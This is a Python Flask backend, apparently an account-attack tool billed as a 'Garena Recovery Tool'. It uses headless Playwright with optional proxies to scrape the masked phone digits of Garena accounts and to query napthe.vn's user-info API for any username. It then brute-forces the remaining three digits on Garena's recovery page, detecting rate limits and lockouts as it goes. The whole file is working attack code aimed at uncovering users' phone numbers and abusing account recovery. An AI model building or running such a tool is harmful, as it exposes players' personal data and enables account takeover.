from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import json
import re
import time
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
import random
import platform
import os

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
ACCOUNT_URL = "https://account.garena.com/"
NAPTHE_LOGIN_URL = "https://napthe.vn/"
NAPTHE_API_URL = "https://napthe.vn/api/auth/get_user_info/multi"
RECOVERY_URL = "https://account.garena.com/recovery"

def extract_last_4_digits(masked_phone):
    """Extract last 4 digits from masked phone format."""
    if not masked_phone:
        return ""
    digits = re.findall(r"\d", masked_phone)
    return "".join(digits[-4:]) if len(digits) >= 4 else ""

def extract_first_3_digits(masked_phone_display):
    """Extract first 3 digits from masked phone format."""
    if not masked_phone_display:
        return ""
    phone_clean = masked_phone_display.replace(" ", "").strip()
    if phone_clean.startswith("+84"):
        phone_clean = "0" + phone_clean[3:]
    digits = re.findall(r"\d", phone_clean)
    return "".join(digits[:3]) if len(digits) >= 3 else ""

async def phase1_garena_login(username, password, proxy):
    """Phase 1: Login to Garena and extract last 4 digits"""
    result = {"success": False, "last_4_digits": "", "masked_phone": "", "error": ""}
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            print(f"[Phase 1] Going to login page...")
            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(2)
            
            print(f"[Phase 1] Filling credentials...")
            await page.fill("input[name='username'], input[type='text']", username)
            await page.fill("input[name='password'], input[type='password']", password)
            
            print(f"[Phase 1] Clicking login button...")
            await page.click("button[type='submit'], button:has-text('Đăng nhập')")
            await asyncio.sleep(3)
            
            try:
                await page.wait_for_load_state("networkidle", timeout=5000)
            except:
                pass
            
            print(f"[Phase 1] Current URL: {page.url}")
            
            if "sso.garena.com" in page.url and "/login" in page.url:
                result["error"] = "Still on login page - invalid credentials"
                await browser.close()
                return result
            
            print(f"[Phase 1] Going to account page...")
            await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(2)
            
            print(f"[Phase 1] Extracting phone number...")
            page_text = await page.evaluate("() => document.body.innerText")
            
            patterns = [
                r'\+84\s+\*{2,}\d{2,4}',
                r'0\s*\*{2,}\d{2,4}',
                r'\+84\*{2,}\d{2,4}',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, page_text)
                if matches:
                    result["masked_phone"] = matches[0].strip()
                    break
            
            result["last_4_digits"] = extract_last_4_digits(result["masked_phone"])
            
            if result["last_4_digits"]:
                result["success"] = True
                print(f"[Phase 1] ✓ Found last 4 digits: {result['last_4_digits']}")
            else:
                result["error"] = f"Could not extract 4 digits from: {result['masked_phone']}"
                print(f"[Phase 1] ✗ {result['error']}")
            
            await browser.close()
            return result
    
    except Exception as e:
        result["error"] = str(e)
        print(f"[Phase 1] ✗ Exception: {str(e)}")
        if browser:
            await browser.close()
        return result

async def phase2_napthe_api(username, password, garena_username, proxy):
    """Phase 2: Get first 3 digits from napthe.vn API"""
    result = {"success": False, "first_3_digits": "", "full_masked_phone": "", "error": ""}
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            print(f"[Phase 2] Going to napthe login page...")
            await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(2)
            
            try:
                print(f"[Phase 2] Filling credentials...")
                await page.fill("input[name='username'], input[type='email']", username)
                await page.fill("input[name='password'], input[type='password']", password)
                
                print(f"[Phase 2] Clicking login...")
                await page.click("button[type='submit'], button:has-text('Đăng nhập')")
                await asyncio.sleep(3)
                
                try:
                    await page.wait_for_load_state("networkidle", timeout=5000)
                except:
                    pass
            except Exception as e:
                result["error"] = f"napthe login failed: {str(e)}"
                print(f"[Phase 2] ✗ {result['error']}")
                await browser.close()
                return result
            
            print(f"[Phase 2] Calling API...")
            try:
                api_response = await page.evaluate(f"""
                    (async () => {{
                        try {{
                            const response = await fetch('{NAPTHE_API_URL}', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{username: '{garena_username}'}})
                            }});
                            return await response.json();
                        }} catch (e) {{
                            return {{'error': e.message}};
                        }}
                    }})()
                """)
                
                print(f"[Phase 2] API Response: {json.dumps(api_response)}")
                
                phone = None
                if "display_mobile_no" in api_response:
                    phone = api_response.get("display_mobile_no")
                elif "data" in api_response and isinstance(api_response.get("data"), dict):
                    phone = api_response["data"].get("display_mobile_no")
                
                if phone:
                    result["full_masked_phone"] = str(phone)
                    result["first_3_digits"] = extract_first_3_digits(str(phone))
                    
                    if result["first_3_digits"]:
                        result["success"] = True
                        print(f"[Phase 2] ✓ Found first 3 digits: {result['first_3_digits']}")
                    else:
                        result["error"] = f"Could not extract 3 digits from: {phone}"
                        print(f"[Phase 2] ✗ {result['error']}")
                else:
                    result["error"] = "No phone found in API response"
                    print(f"[Phase 2] ✗ {result['error']}")
                
                await browser.close()
                return result
            
            except Exception as e:
                result["error"] = f"API call error: {str(e)}"
                print(f"[Phase 2] ✗ {result['error']}")
                await browser.close()
                return result
    
    except Exception as e:
        result["error"] = str(e)
        print(f"[Phase 2] ✗ Exception: {str(e)}")
        if browser:
            await browser.close()
        return result

async def phase3_brute_force(username, first_3_digits, last_4_digits, proxy):
    """Phase 3: Brute force middle 3 digits (100-999)"""
    result = {"success": False, "complete_phone": "", "attempts": 0, "error": ""}
    
    if not first_3_digits or not last_4_digits:
        result["error"] = "Missing first 3 or last 4 digits"
        return result
    
    args = []
    if platform.system() != "Windows":
        args = ["--no-sandbox"]
    
    launch_kwargs = {"headless": True, "args": args}
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    browser = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            print(f"[Phase 3] Going to recovery page...")
            await page.goto(RECOVERY_URL, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(2)
            
            print(f"[Phase 3] Starting brute force...")
            print(f"[Phase 3] Pattern: {first_3_digits}XXX{last_4_digits}")
            
            # Try to fill username
            try:
                inputs = await page.query_selector_all("input[type='text'], input[placeholder*='username']")
                if inputs:
                    await inputs[0].fill(username)
                    print(f"[Phase 3] Filled username")
            except:
                pass
            
            await asyncio.sleep(1)
            
            # Brute force from 100 to 999
            for middle in range(100, 1000):
                result["attempts"] = middle - 100 + 1
                test_phone = f"{first_3_digits}{str(middle)}{last_4_digits}"
                
                try:
                    # Find and fill phone input
                    inputs = await page.query_selector_all("input[placeholder*='****'], input[placeholder*='điện thoại']")
                    if inputs:
                        await inputs[0].fill("")
                        await inputs[0].fill(test_phone)
                    
                    # Find and click submit button
                    buttons = await page.query_selector_all("button[type='submit'], button:has-text('Nhận mã')")
                    if buttons:
                        await buttons[0].click()
                    
                    await asyncio.sleep(2)
                    
                    page_content = await page.content()
                    
                    # Check success indicators
                    success_indicators = [
                        "nhận mã",
                        "gửi mã",
                        "xác minh",
                        "verify",
                        "otp",
                        "mã xác minh",
                        "tiếp tục",
                        "next"
                    ]
                    
                    if any(ind.lower() in page_content.lower() for ind in success_indicators):
                        result["complete_phone"] = test_phone
                        result["success"] = True
                        print(f"[Phase 3] ✓ Found: {test_phone} (attempt {result['attempts']})")
                        break
                    
                    # Check error conditions
                    if "429" in page_content or "too many" in page_content.lower():
                        result["error"] = "Rate limited (429)"
                        print(f"[Phase 3] ✗ Rate limited at attempt {result['attempts']}")
                        break
                    
                    if "locked" in page_content.lower() or "khóa" in page_content.lower():
                        result["error"] = "Account locked"
                        print(f"[Phase 3] ✗ Account locked at attempt {result['attempts']}")
                        break
                    
                    # Progress logging
                    if result["attempts"] % 100 == 0:
                        print(f"[Phase 3] Progress: {result['attempts']}/900 - Testing {test_phone}")
                
                except Exception as e:
                    if result["attempts"] % 200 == 0:
                        print(f"[Phase 3] Warning: {str(e)[:50]}")
                    await asyncio.sleep(1)
                    continue
            
            if not result["success"]:
                result["error"] = f"No valid phone found after {result['attempts']} attempts"
                print(f"[Phase 3] ✗ {result['error']}")
            
            await browser.close()
            return result
    
    except Exception as e:
        result["error"] = str(e)
        print(f"[Phase 3] ✗ Exception: {str(e)}")
        if browser:
            await browser.close()
        return result

# Flask Routes

@app.route('/phase1', methods=['POST', 'OPTIONS'])
def phase1_endpoint():
    """Phase 1 endpoint - Garena login"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        proxy = data.get('proxy')
        
        result = asyncio.run(phase1_garena_login(username, password, proxy))
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/phase2', methods=['POST', 'OPTIONS'])
def phase2_endpoint():
    """Phase 2 endpoint - napthe API"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        proxy = data.get('proxy')
        
        result = asyncio.run(phase2_napthe_api(username, password, username, proxy))
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/phase3', methods=['POST', 'OPTIONS'])
def phase3_endpoint():
    """Phase 3 endpoint - Brute force"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        username = data.get('username')
        first_3_digits = data.get('first_3_digits')
        last_4_digits = data.get('last_4_digits')
        proxy = data.get('proxy')
        
        result = asyncio.run(phase3_brute_force(username, first_3_digits, last_4_digits, proxy))
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/health', methods=['GET', 'OPTIONS'])
def health():
    """Health check endpoint"""
    if request.method == 'OPTIONS':
        return '', 200
    
    return jsonify({"status": "ok", "timestamp": time.time()})

@app.before_request
def before_request():
    """Handle CORS preflight requests"""
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        headers = None
        if 'Access-Control-Request-Headers' in request.headers:
            headers = request.headers.get('Access-Control-Request-Headers')
        
        if headers is None:
            headers = "Content-Type"
        
        response.headers.add('Access-Control-Allow-Headers', headers)
        response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        response.headers.add('Access-Control-Allow-Origin', '*')
        return response

if __name__ == '__main__':
    print("=" * 60)
    print("🚀 Garena Recovery Tool - Backend API Server")
    print("=" * 60)
    print("📍 Running on http://localhost:5000")
    print("📍 Or http://0.0.0.0:5000 (for external access)")
    print("\n📋 Endpoints:")
    print("   - POST /phase1 - Garena login & get last 4 digits")
    print("   - POST /phase2 - Napthe API & get first 3 digits")
    print("   - POST /phase3 - Brute force middle 3 digits")
    print("   - GET /health - Health check")
    print("\n💡 For external access, use ngrok:")
    print("   ngrok http 5000")
    print("\n⏳ Make sure to open index.html in a browser")
    print("=" * 60)
    
    # Get host and port from environment variables or use defaults
    host = os.environ.get('HOST', '0.0.0.0')
    port = int(os.environ.get('PORT', 5000))
    
    app.run(host=host, port=port, debug=False, threaded=True)
